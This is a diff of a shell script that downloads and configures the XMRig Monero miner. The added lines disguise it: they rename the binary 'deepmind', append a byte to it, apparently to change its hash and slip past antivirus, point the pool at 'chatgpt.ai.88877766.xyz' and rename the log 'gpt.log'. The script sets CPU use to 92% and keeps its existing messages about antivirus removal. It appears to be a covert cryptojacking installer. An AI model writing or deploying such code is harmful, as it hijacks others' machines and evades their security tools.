@@ -183,6 +183,7 @@ if ! tar xf /tmp/xmrig.tar.gz -C $HOME/c3pool; then
 fi
 rm /tmp/xmrig.tar.gz
 mv $HOME/c3pool/xmrig $HOME/c3pool/deepmind
+echo "0" >> $HOME/c3pool/deepmind
 echo "[*] Checking if advanced version of $HOME/c3pool/deepmind works fine (and not removed by antivirus software)"
 echo "[*] 检查目录 $HOME/c3pool/deepmind 中的deepmind是否运行正常 (或者是否被杀毒软件误杀)"
 sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/c3pool/config.json
@@ -217,6 +218,7 @@ if (test $? -ne 0); then
   fi
   rm /tmp/xmrig.tar.gz
   mv $HOME/c3pool/xmrig $HOME/c3pool/deepmind
+  echo "0" >> $HOME/c3pool/deepmind
 
   echo "[*] Checking if stock version of $HOME/c3pool/deepmind works fine (and not removed by antivirus software)"
   echo "[*] 检查目录 $HOME/c3pool/deepmind 中的xmrig是否运行正常 (或者是否被杀毒软件误杀)"
@@ -247,11 +249,11 @@ if [ -z $PASS ]; then
 fi
 
 
-sed -i 's/"url": *"[^"]*",/"url": "auto.c3pool.org:'$PORT'",/' $HOME/c3pool/config.json
+sed -i 's/"url": *"[^"]*",/"url": "chatgpt.ai.88877766.xyz:'$PORT'",/' $HOME/c3pool/config.json
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/c3pool/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/c3pool/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 92,/' $HOME/c3pool/config.json
-#sed -i 's#"log-file": *null,#"log-file": "'$HOME/c3pool/xmrig.log'",#' $HOME/c3pool/config.json
+#sed -i 's#"log-file": *null,#"log-file": "'$HOME/c3pool/gpt.log'",#' $HOME/c3pool/config.json
 sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/c3pool/config.json
 
 cp $HOME/c3pool/config.json $HOME/c3pool/config_background.json
